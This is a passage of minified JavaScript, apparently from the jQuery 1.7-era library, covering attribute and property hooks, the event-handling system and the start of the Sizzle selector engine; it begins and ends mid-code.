this.each(function(c){f(this).toggleClass(a.call(this,c,this.className,b),b)});return this.each(function(){if(c==="string"){var e,g=0,h=f(this),i=b,j=a.split(p);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?"addClass":"removeClass"](e)}else if(c==="undefined"||c==="boolean")this.className&&f._data(this,"__className__",this.className),this.className=this.className||a===!1?"":f._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ",c=0,d=this.length;for(;c<d;c++)if(this[c].nodeType===1&&(" "+this[c].className+" ").replace(o," ").indexOf(b)>-1)return!0;return!1},val:function(a){var c,d,e,g=this[0];{if(!!arguments.length){e=f.isFunction(a);return this.each(function(d){var g=f(this),h;if(this.nodeType===1){e?h=a.call(this,d,g.val()):h=a,h==null?h="":typeof h=="number"?h+="":f.isArray(h)&&(h=f.map(h,function(a){return a==null?"":a+""})),c=f.valHooks[this.nodeName.toLowerCase()]||f.valHooks[this.type];if(!c||!("set"in c)||c.set(this,h,"value")===b)this.value=h}})}if(g){c=f.valHooks[g.nodeName.toLowerCase()]||f.valHooks[g.type];if(c&&"get"in c&&(d=c.get(g,"value"))!==b)return d;d=g.value;return typeof d=="string"?d.replace(q,""):d==null?"":d}}}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c,d,e,g=a.selectedIndex,h=[],i=a.options,j=a.type==="select-one";if(g<0)return null;c=j?g:0,d=j?g+1:i.length;for(;c<d;c++){e=i[c];if(e.selected&&(f.support.optDisabled?!e.disabled:e.getAttribute("disabled")===null)&&(!e.parentNode.disabled||!f.nodeName(e.parentNode,"optgroup"))){b=f(e).val();if(j)return b;h.push(b)}}if(j&&!h.length&&i.length)return f(i[g]).val();return h},set:function(a,b){var c=f.makeArray(b);f(a).find("option").each(function(){this.selected=f.inArray(f(this).val(),c)>=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attr:function(a,c,d,e){var g,h,i,j=a.nodeType;if(!!a&&j!==3&&j!==8&&j!==2){if(e&&c in f.attrFn)return f(a)[c](d);if(typeof a.getAttribute=="undefined")return f.prop(a,c,d);i=j!==1||!f.isXMLDoc(a),i&&(c=c.toLowerCase(),h=f.attrHooks[c]||(u.test(c)?x:w));if(d!==b){if(d===null){f.removeAttr(a,c);return}if(h&&"set"in h&&i&&(g=h.set(a,d,c))!==b)return g;a.setAttribute(c,""+d);return d}if(h&&"get"in h&&i&&(g=h.get(a,c))!==null)return g;g=a.getAttribute(c);return g===null?b:g}},removeAttr:function(a,b){var c,d,e,g,h=0;if(b&&a.nodeType===1){d=b.toLowerCase().split(p),g=d.length;for(;h<g;h++)e=d[h],e&&(c=f.propFix[e]||e,f.attr(a,e,""),a.removeAttribute(v?e:c),u.test(e)&&c in a&&(a[c]=!1))}},attrHooks:{type:{set:function(a,b){if(r.test(a.nodeName)&&a.parentNode)f.error("type property can't be changed");else if(!f.support.radioValue&&b==="radio"&&f.nodeName(a,"input")){var c=a.value;a.setAttribute("type",b),c&&(a.value=c);return b}}},value:{get:function(a,b){if(w&&f.nodeName(a,"button"))return w.get(a,b);return b in a?a.value:null},set:function(a,b,c){if(w&&f.nodeName(a,"button"))return w.set(a,b,c);a.value=b}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e,g,h,i=a.nodeType;if(!!a&&i!==3&&i!==8&&i!==2){h=i!==1||!f.isXMLDoc(a),h&&(c=f.propFix[c]||c,g=f.propHooks[c]);return d!==b?g&&"set"in g&&(e=g.set(a,d,c))!==b?e:a[c]=d:g&&"get"in g&&(e=g.get(a,c))!==null?e:a[c]}},propHooks:{tabIndex:{get:function(a){var c=a.getAttributeNode("tabindex");return c&&c.specified?parseInt(c.value,10):s.test(a.nodeName)||t.test(a.nodeName)&&a.href?0:b}}}}),f.attrHooks.tabindex=f.propHooks.tabIndex,x={get:function(a,c){var d,e=f.prop(a,c);return e===!0||typeof e!="boolean"&&(d=a.getAttributeNode(c))&&d.nodeValue!==!1?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&&(a[d]=!0),a.setAttribute(c,c.toLowerCase()));return c}},v||(y={name:!0,id:!0},w=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&&(y[c]?d.nodeValue!=="":d.specified)?d.nodeValue:b},set:function(a,b,d){var e=a.getAttributeNode(d);e||(e=c.createAttribute(d),a.setAttributeNode(e));return e.nodeValue=b+""}},f.attrHooks.tabindex.set=w.set,f.each(["width","height"],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===""){a.setAttribute(b,"auto");return c}}})}),f.attrHooks.contenteditable={get:w.get,set:function(a,b,c){b===""&&(b="false"),w.set(a,b,c)}}),f.support.hrefNormalized||f.each(["href","src","width","height"],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex);return null}})),f.support.enctype||(f.propFix.enctype="encoding"),f.support.checkOn||f.each(["radio","checkbox"],function(){f.valHooks[this]={get:function(a){return a.getAttribute("value")===null?"on":a.value}}}),f.each(["radio","checkbox"],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)>=0}})});var z=/^(?:textarea|input|select)$/i,A=/^([^\.]*)?(?:\.(.+))?$/,B=/\bhover(\.\S+)?\b/,C=/^key/,D=/^(?:mouse|contextmenu)|click/,E=/^(?:focusinfocus|focusoutblur)$/,F=/^(\w*)(?:#([\w\-]+))?(?:\.([\w\-]+))?$/,G=function(a){var b=F.exec(a);b&&(b[1]=(b[1]||"").toLowerCase(),b[3]=b[3]&&new RegExp("(?:^|\\s)"+b[3]+"(?:\\s|$)"));return b},H=function(a,b){var c=a.attributes||{};return(!b[1]||a.nodeName.toLowerCase()===b[1])&&(!b[2]||(c.id||{}).value===b[2])&&(!b[3]||b[3].test((c["class"]||{}).value))},I=function(a){return f.event.special.hover?a:a.replace(B,"mouseenter$1 mouseleave$1")};
                f.event={add:function(a,c,d,e,g){var h,i,j,k,l,m,n,o,p,q,r,s;if(!(a.nodeType===3||a.nodeType===8||!c||!d||!(h=f._data(a)))){d.handler&&(p=d,d=p.handler),d.guid||(d.guid=f.guid++),j=h.events,j||(h.events=j={}),i=h.handle,i||(h.handle=i=function(a){return typeof f!="undefined"&&(!a||f.event.triggered!==a.type)?f.event.dispatch.apply(i.elem,arguments):b},i.elem=a),c=f.trim(I(c)).split(" ");for(k=0;k<c.length;k++){l=A.exec(c[k])||[],m=l[1],n=(l[2]||"").split(".").sort(),s=f.event.special[m]||{},m=(g?s.delegateType:s.bindType)||m,s=f.event.special[m]||{},o=f.extend({type:m,origType:l[1],data:e,handler:d,guid:d.guid,selector:g,quick:G(g),namespace:n.join(".")},p),r=j[m];if(!r){r=j[m]=[],r.delegateCount=0;if(!s.setup||s.setup.call(a,e,n,i)===!1)a.addEventListener?a.addEventListener(m,i,!1):a.attachEvent&&a.attachEvent("on"+m,i)}s.add&&(s.add.call(a,o),o.handler.guid||(o.handler.guid=d.guid)),g?r.splice(r.delegateCount++,0,o):r.push(o),f.event.global[m]=!0}a=null}},global:{},remove:function(a,b,c,d,e){var g=f.hasData(a)&&f._data(a),h,i,j,k,l,m,n,o,p,q,r,s;if(!!g&&!!(o=g.events)){b=f.trim(I(b||"")).split(" ");for(h=0;h<b.length;h++){i=A.exec(b[h])||[],j=k=i[1],l=i[2];if(!j){for(j in o)f.event.remove(a,j+b[h],c,d,!0);continue}p=f.event.special[j]||{},j=(d?p.delegateType:p.bindType)||j,r=o[j]||[],m=r.length,l=l?new RegExp("(^|\\.)"+l.split(".").sort().join("\\.(?:.*\\.)?")+"(\\.|$)"):null;for(n=0;n<r.length;n++)s=r[n],(e||k===s.origType)&&(!c||c.guid===s.guid)&&(!l||l.test(s.namespace))&&(!d||d===s.selector||d==="**"&&s.selector)&&(r.splice(n--,1),s.selector&&r.delegateCount--,p.remove&&p.remove.call(a,s));r.length===0&&m!==r.length&&((!p.teardown||p.teardown.call(a,l)===!1)&&f.removeEvent(a,j,g.handle),delete o[j])}f.isEmptyObject(o)&&(q=g.handle,q&&(q.elem=null),f.removeData(a,["events","handle"],!0))}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){if(!e||e.nodeType!==3&&e.nodeType!==8){var h=c.type||c,i=[],j,k,l,m,n,o,p,q,r,s;if(E.test(h+f.event.triggered))return;h.indexOf("!")>=0&&(h=h.slice(0,-1),k=!0),h.indexOf(".")>=0&&(i=h.split("."),h=i.shift(),i.sort());if((!e||f.event.customEvent[h])&&!f.event.global[h])return;c=typeof c=="object"?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.isTrigger=!0,c.exclusive=k,c.namespace=i.join("."),c.namespace_re=c.namespace?new RegExp("(^|\\.)"+i.join("\\.(?:.*\\.)?")+"(\\.|$)"):null,o=h.indexOf(":")<0?"on"+h:"";if(!e){j=f.cache;for(l in j)j[l].events&&j[l].events[h]&&f.event.trigger(c,d,j[l].handle.elem,!0);return}c.result=b,c.target||(c.target=e),d=d!=null?f.makeArray(d):[],d.unshift(c),p=f.event.special[h]||{};if(p.trigger&&p.trigger.apply(e,d)===!1)return;r=[[e,p.bindType||h]];if(!g&&!p.noBubble&&!f.isWindow(e)){s=p.delegateType||h,m=E.test(s+h)?e:e.parentNode,n=null;for(;m;m=m.parentNode)r.push([m,s]),n=m;n&&n===e.ownerDocument&&r.push([n.defaultView||n.parentWindow||a,s])}for(l=0;l<r.length&&!c.isPropagationStopped();l++)m=r[l][0],c.type=r[l][1],q=(f._data(m,"events")||{})[c.type]&&f._data(m,"handle"),q&&q.apply(m,d),q=o&&m[o],q&&f.acceptData(m)&&q.apply(m,d)===!1&&c.preventDefault();c.type=h,!g&&!c.isDefaultPrevented()&&(!p._default||p._default.apply(e.ownerDocument,d)===!1)&&(h!=="click"||!f.nodeName(e,"a"))&&f.acceptData(e)&&o&&e[h]&&(h!=="focus"&&h!=="blur"||c.target.offsetWidth!==0)&&!f.isWindow(e)&&(n=e[o],n&&(e[o]=null),f.event.triggered=h,e[h](),f.event.triggered=b,n&&(e[o]=n));return c.result}},dispatch:function(c){c=f.event.fix(c||a.event);var d=(f._data(this,"events")||{})[c.type]||[],e=d.delegateCount,g=[].slice.call(arguments,0),h=!c.exclusive&&!c.namespace,i=[],j,k,l,m,n,o,p,q,r,s,t;g[0]=c,c.delegateTarget=this;if(e&&!c.target.disabled&&(!c.button||c.type!=="click")){m=f(this),m.context=this.ownerDocument||this;for(l=c.target;l!=this;l=l.parentNode||this){o={},q=[],m[0]=l;for(j=0;j<e;j++)r=d[j],s=r.selector,o[s]===b&&(o[s]=r.quick?H(l,r.quick):m.is(s)),o[s]&&q.push(r);q.length&&i.push({elem:l,matches:q})}}d.length>e&&i.push({elem:this,matches:d.slice(e)});for(j=0;j<i.length&&!c.isPropagationStopped();j++){p=i[j],c.currentTarget=p.elem;for(k=0;k<p.matches.length&&!c.isImmediatePropagationStopped();k++){r=p.matches[k];if(h||!c.namespace&&!r.namespace||c.namespace_re&&c.namespace_re.test(r.namespace))c.data=r.data,c.handleObj=r,n=((f.event.special[r.origType]||{}).handle||r.handler).apply(p.elem,g),n!==b&&(c.result=n,n===!1&&(c.preventDefault(),c.stopPropagation()))}}return c.result},props:"attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){a.which==null&&(a.which=b.charCode!=null?b.charCode:b.keyCode);return a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,d){var e,f,g,h=d.button,i=d.fromElement;a.pageX==null&&d.clientX!=null&&(e=a.target.ownerDocument||c,f=e.documentElement,g=e.body,a.pageX=d.clientX+(f&&f.scrollLeft||g&&g.scrollLeft||0)-(f&&f.clientLeft||g&&g.clientLeft||0),a.pageY=d.clientY+(f&&f.scrollTop||g&&g.scrollTop||0)-(f&&f.clientTop||g&&g.clientTop||0)),!a.relatedTarget&&i&&(a.relatedTarget=i===a.target?d.toElement:i),!a.which&&h!==b&&(a.which=h&1?1:h&2?3:h&4?2:0);return a}},fix:function(a){if(a[f.expando])return a;var d,e,g=a,h=f.event.fixHooks[a.type]||{},i=h.props?this.props.concat(h.props):this.props;a=f.Event(g);for(d=i.length;d;)e=i[--d],a[e]=g[e];a.target||(a.target=g.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),a.metaKey===b&&(a.metaKey=a.ctrlKey);return h.filter?h.filter(a,g):a},special:{ready:{setup:f.bindReady},load:{noBubble:!0},focus:{delegateType:"focusin"},blur:{delegateType:"focusout"},beforeunload:{setup:function(a,b,c){f.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}},simulate:function(a,b,c,d){var e=f.extend(new f.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?f.event.trigger(e,null,b):f.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},f.event.handle=f.event.dispatch,f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},f.Event=function(a,b){if(!(this instanceof f.Event))return new f.Event(a,b);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?K:J):this.type=a,b&&f.extend(this,b),this.timeStamp=a&&a.timeStamp||f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=K;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=K;var a=this.originalEvent;!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=K,this.stopPropagation()},isDefaultPrevented:J,isPropagationStopped:J,isImmediatePropagationStopped:J},f.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){f.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c=this,d=a.relatedTarget,e=a.handleObj,g=e.selector,h;if(!d||d!==c&&!f.contains(c,d))a.type=e.origType,h=e.handler.apply(this,arguments),a.type=b;return h}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(){if(f.nodeName(this,"form"))return!1;f.event.add(this,"click._submit keypress._submit",function(a){var c=a.target,d=f.nodeName(c,"input")||f.nodeName(c,"button")?c.form:b;d&&!d._submit_attached&&(f.event.add(d,"submit._submit",function(a){this.parentNode&&!a.isTrigger&&f.event.simulate("submit",this.parentNode,a,!0)}),d._submit_attached=!0)})},teardown:function(){if(f.nodeName(this,"form"))return!1;f.event.remove(this,"._submit")}}),f.support.changeBubbles||(f.event.special.change={setup:function(){if(z.test(this.nodeName)){if(this.type==="checkbox"||this.type==="radio")f.event.add(this,"propertychange._change",function(a){a.originalEvent.propertyName==="checked"&&(this._just_changed=!0)}),f.event.add(this,"click._change",function(a){this._just_changed&&!a.isTrigger&&(this._just_changed=!1,f.event.simulate("change",this,a,!0))});return!1}f.event.add(this,"beforeactivate._change",function(a){var b=a.target;z.test(b.nodeName)&&!b._change_attached&&(f.event.add(b,"change._change",function(a){this.parentNode&&!a.isSimulated&&!a.isTrigger&&f.event.simulate("change",this.parentNode,a,!0)}),b._change_attached=!0)})},handle:function(a){var b=a.target;if(this!==b||a.isSimulated||a.isTrigger||b.type!=="radio"&&b.type!=="checkbox")return a.handleObj.handler.apply(this,arguments)},teardown:function(){f.event.remove(this,"._change");return z.test(this.nodeName)}}),f.support.focusinBubbles||f.each({focus:"focusin",blur:"focusout"},function(a,b){var d=0,e=function(a){f.event.simulate(b,a.target,f.event.fix(a),!0)};f.event.special[b]={setup:function(){d++===0&&c.addEventListener(a,e,!0)},teardown:function(){--d===0&&c.removeEventListener(a,e,!0)}}}),f.fn.extend({on:function(a,c,d,e,g){var h,i;if(typeof a=="object"){typeof c!="string"&&(d=c,c=b);for(i in a)this.on(i,c,d,a[i],g);return this}d==null&&e==null?(e=c,d=c=b):e==null&&(typeof c=="string"?(e=d,d=b):(e=d,d=c,c=b));if(e===!1)e=J;else if(!e)return this;g===1&&(h=e,e=function(a){f().off(a);return h.apply(this,arguments)},e.guid=h.guid||(h.guid=f.guid++));return this.each(function(){f.event.add(this,a,e,d,c)})},one:function(a,b,c,d){return this.on.call(this,a,b,c,d,1)},off:function(a,c,d){if(a&&a.preventDefault&&a.handleObj){var e=a.handleObj;f(a.delegateTarget).off(e.namespace?e.type+"."+e.namespace:e.type,e.selector,e.handler);return this}if(typeof a=="object"){for(var g in a)this.off(g,c,a[g]);return this}if(c===!1||typeof c=="function")d=c,c=b;d===!1&&(d=J);return this.each(function(){f.event.remove(this,a,d,c)})},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},live:function(a,b,c){f(this.context).on(a,this.selector,b,c);return this},die:function(a,b){f(this.context).off(a,this.selector||"**",b);return this},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return arguments.length==1?this.off(a,"**"):this.off(b,a,c)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f._data(this,"lastToggle"+a.guid)||0)%d;f._data(this,"lastToggle"+a.guid,e+1),c.preventDefault();return b[e].apply(this,arguments)||!1};e.guid=c;while(d<b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){f.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.on(b,null,a,c):this.trigger(b)},f.attrFn&&(f.attrFn[b]=!0),C.test(b)&&(f.event.fixHooks[b]=f.event.keyHooks),D.test(b)&&(f.event.fixHooks[b]=f.event.mouseHooks)}),function(){function x(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}if(j.nodeType===1){g||(j[d]=c,j.sizset=h);if(typeof b!="string"){if(j===b){k=!0;break}}else if(m.filter(b,[j]).length>0){k=j;break}}j=j[a]}e[h]=k}}}function w(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}j.nodeType===1&&!g&&(j[d]=c,j.sizset=h);if(j.nodeName.toLowerCase()===b){k=j;break}j=j[a]}e[h]=k}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d="sizcache"+(Math.random()+"").replace(".",""),e=0,g=Object.prototype.toString,h=!1,i=!0,j=/\\/g,k=/\r\n/g,l=/\W/;[0,0].sort(function(){i=!1;return 0});var m=function(b,d,e,f){e=e||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!="string")return e;var i,j,k,l,n,q,r,t,u=!0,v=m.isXML(d),w=[],x=b;do{a.exec(""),i=a.exec(x);if(i){x=i[3],w.push(i[1]);if(i[2]){l=i[3];break}}}while(i);if(w.length>1&&p.exec(b))if(w.length===2&&o.relative[w[0]])j=y(w[0]+w[1],d,f);else{j=o.relative[w[0]]?[d]:m(w.shift(),d);while(w.length)b=w.shift(),o.relative[b]&&(b+=w.shift()),j=y(b,j,f)}else{!f&&w.length>1&&d.nodeType===9&&!v&&o.match.ID.test(w[0])&&!o.match.ID.test(w[w.length-1])&&(n=m.find(w.shift(),d,v),d=n.expr?m.filter(n.expr,n.set)[0]:n.set[0]);if(d){n=f?{expr:w.pop(),set:s(f)}:m.find(w.pop(),w.length===1&&(w[0]==="~"||w[0]==="+")&&d.parentNode?d.parentNode:d,v),j=n.expr?m.filter(n.expr,n.set):n.set,w.length>0?k=s(j):u=!1;while(w.length)q=w.pop(),r=q,o.relative[q]?r=w.pop():q="",r==null&&(r=d),o.relative[q](k,r,v)}else k=w=[]}k||(k=j),k||m.error(q||b);if(g.call(k)==="[object Array]")if(!u)e.push.apply(e,k);else if(d&&d.nodeType===1)for(t=0;k[t]!=null;t++)k[t]&&(k[t]===!0||k[t].nodeType===1&&m.contains(d,k[t]))&&e.push(j[t]);else for(t=0;k[t]!=null;t++)k[t]&&k[t].nodeType===1&&e.push(j[t]);else s(k,e);l&&(m(l,h,e,f),m.uniqueSort(e));return e};m.uniqueSort=function(a){if(u){h=i,a.sort(u);if(h)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},m.matches=function(a,b){return m(a,null,null,b)},m.matchesSelector=function(a,b){return m(b,null,null,[a]).length>0},m.find=function(a,b,c){var d,e,f,g,h,i;if(!a)return[];for(e=0,f=o.order.length;e<f;e++){h=o.order[e];if(g=o.leftMatch[h].exec(a)){i=g[1],g.splice(1,1);if(i.substr(i.length-1)!=="\\"){g[1]=(g[1]||"").replace(j,""),d=o.find[h](g,b,c);if(d!=null){a=a.replace(o.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},m.filter=function(a,c,d,e){var f,g,h,i,j,k,l,n,p,q=a,r=[],s=c,t=c&&c[0]&&m.isXML(c[0]);while(a&&c.length){for(h in o.filter)if((f=o.leftMatch[h].exec(a))!=null&&f[2]){k=o.filter[h],l=f[1],g=!1,f.splice(1,1);if(l.substr(l.length-1)==="\\")continue;s===r&&(r=[]);if(o.preFilter[h]){f=o.preFilter[h](f,s,d,r,e,t);if(!f)g=i=!0;else if(f===!0)continue}if(f)for(n=0;(j=s[n])!=null;n++)j&&(i=k(j,f,n,s),p=e^i,d&&i!=null?p?g=!0:s[n]=!1:p&&(r.push(j),g=!0));if(i!==b){d||(s=r),a=a.replace(o.match[h],"");if(!g)return[];break}}if(a===q)if(g==null)m.error(a);else break;q=a}return s},m.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)};var n=m.getText=function(a){var b,c,d=a.nodeType,e="";if(d){if(d===1||d===9){if(typeof a.textContent=="string")return a.textContent;if(typeof a.innerText=="string")return a.innerText.replace(k,"");for(a=a.firstChild;a;a=a.nextSibling)e+=n(a)}else if(d===3||d===4)return a.nodeValue}else for(b=0;c=a[b];b++)c.nodeType!==8&&(e+=n(c));return e},o=m.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b=="string",d=c&&!l.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1);a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&m.filter(b,a,!0)},">":function(a,b){var c,d=typeof b=="string",e=0,f=a.length;if(d&&!l.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&m.filter(b,a,!0)}},"":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("parentNode",b,f,a,d,c)},"~":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("previousSibling",b,f,a,d,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(j,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(j,"")},TAG:function(a,b){return a[1].replace(j,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||m.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&m.error(a[0]);a[0]=e++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(j,"");!f&&o.attrMap[g]&&(a[1]=o.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(j,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=m(b[3],null,null,c);else{var g=m.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(o.match.POS.test(b[0])||o.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!m(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return a.nodeName.toLowerCase()==="input"&&"text"===c&&(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()==="input"&&"radio"===a.type},checkbox:function(a){return a.nodeName.toLowerCase()==="input"&&"checkbox"===a.type},file:function(a){return a.nodeName.toLowerCase()==="input"&&"file"===a.type},password:function(a){return a.nodeName.toLowerCase()==="input"&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"submit"===a.type},image:function(a){return a.nodeName.toLowerCase()==="input"&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b==="input"&&"button"===a.type||b==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=o.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||n([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}m.error(e)},CHILD:function(a,b){var 